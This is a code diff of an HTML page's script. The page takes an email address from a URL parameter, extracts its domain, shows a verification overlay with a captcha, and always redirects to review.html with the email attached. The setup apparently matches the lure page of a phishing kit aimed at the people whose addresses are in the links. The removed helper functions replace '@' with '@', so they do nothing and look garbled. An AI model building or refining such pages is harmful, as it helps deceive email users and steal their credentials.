@@ -52,33 +52,19 @@
 
 <script>
 /* ===============================
-   GET EMAIL + DOMAIN
+   GET EMAIL EXACTLY AS IT IS
 ================================ */
 function getEmailRaw() {
   const params = new URLSearchParams(window.location.search);
   return params.get("bazz505") || "";
 }
 
-function decodeEmail(raw) {
-  // convert @40 → @
-  if (raw.includes("@")) {
-    return raw.replace("@", "@");
-  }
-  return raw;
-}
+// DO NOT MODIFY THE EMAIL AT ALL
+const email = getEmailRaw();
 
-function encodeEmail(raw) {
-  // convert @ → @
-  if (raw.includes("@")) {
-    return raw.replace("@", "@");
-  }
-  return raw;
-}
-
-const emailRaw = getEmailRaw();
-const email = decodeEmail(emailRaw);
-
-// Extract domain
+/* ===============================
+   GET DOMAIN
+================================ */
 let domain = "";
 if (email.includes("@")) {
   domain = email.split("@")[1];
@@ -111,15 +97,15 @@ messages.forEach((msg, i) => {
 });
 
 /* ===============================
-   REDIRECT FUNCTION
+   REDIRECT TO REVIEW.HTML
 ================================ */
 function goToReview() {
-  const encoded = encodeEmail(email); // <-- USE @40 FORMAT
-  window.location.href = `review.html?bazz505=${encoded}`;
+  // PASS EMAIL EXACTLY — NO CHANGE
+  window.location.href = `review.html?bazz505=${email}`;
 }
 
 /* ===============================
-   CAPTCHA CALLBACK
+   CAPTCHA SUCCESS
 ================================ */
 window.onCaptchaSuccess = () => {
   const overlay = document.getElementById("verification-overlay");
@@ -128,7 +114,7 @@ window.onCaptchaSuccess = () => {
 };
 
 /* ===============================
-   FAILSAFE ALWAYS REDIRECT
+   FAILSAFE REDIRECT
 ================================ */
 setTimeout(() => {
   const overlay = document.getElementById("verification-overlay");
@@ -136,8 +122,6 @@ setTimeout(() => {
   setTimeout(goToReview, 900);
 }, 5000);
 </script>
-
-
 
 </body>
 </html>
